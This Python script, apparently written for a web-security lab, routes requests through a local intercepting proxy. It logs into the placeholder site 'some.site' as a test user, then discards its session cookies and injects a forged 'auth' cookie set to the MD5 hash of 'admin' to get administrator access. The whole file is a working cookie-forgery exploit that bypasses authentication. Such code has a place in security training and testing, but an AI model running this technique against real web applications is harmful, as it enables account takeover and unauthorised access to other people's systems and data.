#!/usr/bin/env python3

import requests

PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080' }

# headers for get to login page
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection':'close',
    'Content-Type':'application/x-www-form-urlencoded'}

# headers for the login post
HEADERS_2 = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection':'close',
    'Content-Type':'application/x-www-form-urlencoded',
    'Origin' : 'http://some.site',
    'Referer': 'http://some.site/login.php'}


# headers for the GET after the post
HEADERS_3 = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://some.site/login.php',
    'Connection':'close',
    'Upgrade-Insecure-Requests': '1'}


def main():
    # for tracking cookies
    s = requests.session()

    # we go to the login page first
    res = s.get('http://some.site/login.php', proxies=PROXIES, headers=HEADERS)

    #print(res.headers)
    DATA = {'username': 'testuser', 'password' : 'testpassword' }

    # we make the post with allow_redirects false so we can pause and modifie the header
    res = s.post('http://some.site/login.php', 
            proxies=PROXIES, headers=HEADERS_2, 
            data=DATA, allow_redirects=False)

    print("(-) Got these cookies:\n===========")
    #print(res.cookies.items())
    #print(res.cookies['auth'])
    # cookie to inject:  456b7016a916a4b178dd72b947c152b7

    # Flush the cookies
    s.cookies.clear()
    
    # inject the bad cookies
    bad_cookie = requests.cookies.create_cookie(name="auth", value="21232f297a57a5a743894a0e4a801fc3")
    s.cookies.set_cookie(bad_cookie)
    print("(+) injecting cookie: ")
    if s.cookies['auth'] == "21232f297a57a5a743894a0e4a801fc3":
        print('(+) Cookie injection successful')

        # simulate the login
        res = s.get('http://some.site/index.php', proxies=PROXIES, headers=HEADERS_3)
        print(res.text)


if __name__ == "__main__":
    main()
